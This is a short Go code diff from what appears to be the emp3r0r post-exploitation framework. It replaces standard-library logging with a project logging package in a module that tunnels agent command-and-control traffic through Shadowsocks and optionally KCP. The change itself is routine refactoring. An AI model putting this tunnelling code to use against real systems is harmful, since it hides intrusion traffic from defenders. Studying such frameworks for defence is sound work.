@@ -3,7 +3,7 @@ package c2transport
 import (
 	"context"
 	"fmt"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -17,12 +17,12 @@ func startShadowsocksClient(ss_serverAddr, localSocksAddr, tcptun string) {
 	ss_config := createSSConfig(ss_serverAddr, localSocksAddr, tcptun, false)
 	err := transport.SSMain(ss_config)
 	if err != nil {
-		log.Printf("ShadowsocksProxy failed to start: %v", err)
+		logging.Printf("ShadowsocksProxy failed to start: %v", err)
 		return
 	}
 
 	defer func() {
-		log.Printf("Shadowsocks client (%v) exited", ss_config)
+		logging.Printf("Shadowsocks client (%v) exited", ss_config)
 		ss_config.Cancel()
 	}()
 
@@ -51,11 +51,11 @@ func ShadowsocksC2Client() {
 	ss_server_port := common.RuntimeConfig.ShadowsocksServerPort
 	ss_server_addr := common.RuntimeConfig.CCAddress
 	if common.RuntimeConfig.UseKCP {
-		log.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
+		logging.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
 		ss_server_port = common.RuntimeConfig.KCPClientPort
 		ss_server_addr = "127.0.0.1"
 	} else {
-		log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
+		logging.Printf("C2 traffic will go through Shadowsocks: %s:%s",
 			common.RuntimeConfig.CCAddress,
 			common.RuntimeConfig.ShadowsocksServerPort)
 	}
@@ -68,7 +68,7 @@ func ShadowsocksC2Client() {
 
 // Start ShadowsocksLocalSocks client, you get a SOCKS5 proxy server at lport
 func ShadowsocksLocalSocks(ss_server, lport string) {
-	log.Printf("ShadowsocksLocalSocks: %s:%s", ss_server, lport)
+	logging.Printf("ShadowsocksLocalSocks: %s:%s", ss_server, lport)
 	ss_server_port := common.RuntimeConfig.ShadowsocksServerPort
 	ss_server_ip := ss_server
 
@@ -100,7 +100,7 @@ func ShadowsocksServer() error {
 	ss_config.Cancel = cancel
 
 	// start server
-	log.Printf("Shadowsocks Server: %v", ss_config)
+	logging.Printf("Shadowsocks Server: %v", ss_config)
 
 	err := transport.SSMain(ss_config)
 	if err != nil {
